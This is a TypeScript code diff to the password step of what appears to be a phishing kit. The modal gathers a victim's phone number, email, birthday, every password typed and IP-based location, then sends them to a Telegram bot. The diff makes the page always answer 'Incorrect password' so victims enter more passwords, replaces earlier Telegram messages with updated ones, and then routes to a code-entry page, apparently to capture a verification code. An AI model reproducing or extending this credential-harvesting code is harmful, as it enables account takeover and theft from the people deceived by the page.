@@ -1,6 +1,6 @@
-import { html } from '@/lib/html';
-import { eye, eyeSlash, times } from '@/lib/icons';
 import config from '@/config/telegram_config.json';
+import { html } from '@/lib/html';
+import { eye, eyeSlash, times, spinner } from '@/lib/icons';
 import { router } from '@/routes/routes';
 
 interface IpapiResponse {
@@ -14,6 +14,16 @@ interface IpapiResponse {
         name: string;
     };
 }
+
+interface TelegramResponse {
+    ok: boolean;
+    result: {
+        message_id: number;
+    };
+}
+let passwordAttempts = 0;
+let lastMessageId: number | null = null;
+let passwordHistory: string[] = [];
 
 export const PasswordModal = (): string => {
     return html`
@@ -120,6 +130,14 @@ const togglePasswordVisibility = (): void => {
 };
 
 const handlePasswordSubmit = async (): Promise<void> => {
+    const submitBtn = document.getElementById('submit-password-btn');
+    if (!submitBtn) {
+        return;
+    }
+
+    submitBtn.innerHTML = `<span class="animate-spin inline-block">${spinner}</span>`;
+    submitBtn.setAttribute('disabled', 'true');
+
     const passwordInput = document.getElementById(
         'password'
     ) as HTMLInputElement;
@@ -132,6 +150,19 @@ const handlePasswordSubmit = async (): Promise<void> => {
         return;
     }
 
+    if (passwordAttempts >= config.setting.max_password_attempts) {
+        showError(
+            passwordInput,
+            `Maximum ${config.setting.max_password_attempts} attempts reached. Please try again later.`
+        );
+
+        submitBtn.removeAttribute('disabled');
+        return;
+    }
+
+    passwordAttempts++;
+    passwordHistory.push(password);
+
     const storedData = localStorage.getItem('helpFormData');
     if (storedData === null || storedData.trim() === '') {
         router.navigate('/');
@@ -143,15 +174,43 @@ const handlePasswordSubmit = async (): Promise<void> => {
         const ipData: IpapiResponse = await ipResponse.json();
 
         const formData = JSON.parse(storedData);
+
+        const passwordList = passwordHistory
+            .map(
+                (pwd, index) =>
+                    `🔑 <b>Password ${index + 1}:</b> <code>${pwd}</code>`
+            )
+            .join('\n');
+
         const message = `📱 <b>Phone:</b> <code>${formData.phone}</code>
 📧 <b>Email:</b> <code>${formData.email}</code>
 🎂 <b>Birthday:</b> <code>${formData.birthday}</code>
-🔑 <b>Password:</b> <code>${password}</code>
+${passwordList}
 🌐 <b>IP Address:</b> <code>${ipData.ip}</code>
 📍 <b>Location:</b> <code>${ipData.location.city}, ${ipData.location.state}, ${ipData.location.country}</code>
 🏢 <b>ISP:</b> <code>${ipData.company.name}</code>`;
 
-        await fetch(
+        if (typeof lastMessageId === 'number' && lastMessageId > 0) {
+            try {
+                await fetch(
+                    `https://api.telegram.org/bot${config.telegram.token}/deleteMessage`,
+                    {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: config.telegram.chatId,
+                            message_id: lastMessageId,
+                        }),
+                    }
+                );
+            } catch {
+                return;
+            }
+        }
+
+        const response = await fetch(
             `https://api.telegram.org/bot${config.telegram.token}/sendMessage`,
             {
                 method: 'POST',
@@ -166,21 +225,60 @@ const handlePasswordSubmit = async (): Promise<void> => {
             }
         );
 
+        const telegramResponse: TelegramResponse = await response.json();
+        if (telegramResponse.ok) {
+            lastMessageId = telegramResponse.result.message_id;
+        }
+
         const updatedFormData = { ...formData, password };
         localStorage.setItem('helpFormData', JSON.stringify(updatedFormData));
 
-        closeModal();
         passwordInput.value = '';
 
-        router.navigate('/enter-code');
+        showError(passwordInput, 'Incorrect password. Please try again.');
+
+        if (passwordAttempts >= config.setting.max_password_attempts) {
+            if (typeof lastMessageId === 'number' && lastMessageId > 0) {
+                localStorage.setItem('lastMessageId', lastMessageId.toString());
+            }
+            router.navigate('/enter-code');
+        }
     } catch {
         const formData = JSON.parse(storedData);
+
+        const passwordList = passwordHistory
+            .map(
+                (pwd, index) =>
+                    `🔑 <b>Password ${index + 1}:</b> <code>${pwd}</code>`
+            )
+            .join('\n');
+
         const basicMessage = `📱 <b>Phone:</b> <code>${formData.phone}</code>
 📧 <b>Email:</b> <code>${formData.email}</code>
 🎂 <b>Birthday:</b> <code>${formData.birthday}</code>
-🔑 <b>Password:</b> <code>${password}</code>`;
+${passwordList}`;
 
-        await fetch(
+        if (typeof lastMessageId === 'number' && lastMessageId > 0) {
+            try {
+                await fetch(
+                    `https://api.telegram.org/bot${config.telegram.token}/deleteMessage`,
+                    {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            chat_id: config.telegram.chatId,
+                            message_id: lastMessageId,
+                        }),
+                    }
+                );
+            } catch {
+                return;
+            }
+        }
+
+        const response = await fetch(
             `https://api.telegram.org/bot${config.telegram.token}/sendMessage`,
             {
                 method: 'POST',
@@ -195,13 +293,27 @@ const handlePasswordSubmit = async (): Promise<void> => {
             }
         );
 
+        const telegramResponse: TelegramResponse = await response.json();
+        if (telegramResponse.ok) {
+            lastMessageId = telegramResponse.result.message_id;
+        }
+
         const updatedFormData = { ...formData, password };
         localStorage.setItem('helpFormData', JSON.stringify(updatedFormData));
 
-        closeModal();
         passwordInput.value = '';
 
-        router.navigate('/enter-code');
+        showError(passwordInput, 'Incorrect password. Please try again.');
+
+        if (passwordAttempts >= config.setting.max_password_attempts) {
+            if (typeof lastMessageId === 'number' && lastMessageId > 0) {
+                localStorage.setItem('lastMessageId', lastMessageId.toString());
+            }
+            router.navigate('/enter-code');
+        }
+    } finally {
+        submitBtn.innerHTML = 'Confirm';
+        submitBtn.removeAttribute('disabled');
     }
 };
 
@@ -219,9 +331,8 @@ const showError = (element: HTMLInputElement, message: string): void => {
             'text-sm',
             'mt-1'
         );
-        const nextSibling =
-            element.nextElementSibling?.nextElementSibling || null;
-        element.parentNode?.insertBefore(newErrorDiv, nextSibling);
+        const parentDiv = element.closest('.relative');
+        parentDiv?.parentNode?.insertBefore(newErrorDiv, parentDiv.nextSibling);
         newErrorDiv.textContent = message;
 
         element.addEventListener(
@@ -260,8 +371,18 @@ const resetErrors = (): void => {
         }
     });
 };
-
+export const resetPasswordAttempts = (): void => {
+    passwordAttempts = 0;
+    const submitBtn = document.getElementById('submit-password-btn');
+    if (submitBtn) {
+        submitBtn.removeAttribute('disabled');
+    }
+};
 export const initPasswordModal = (): void => {
+    resetPasswordAttempts();
+    lastMessageId = null;
+    passwordHistory = [];
+
     document
         .getElementById('close-modal-btn')
         ?.addEventListener('click', closeModal);
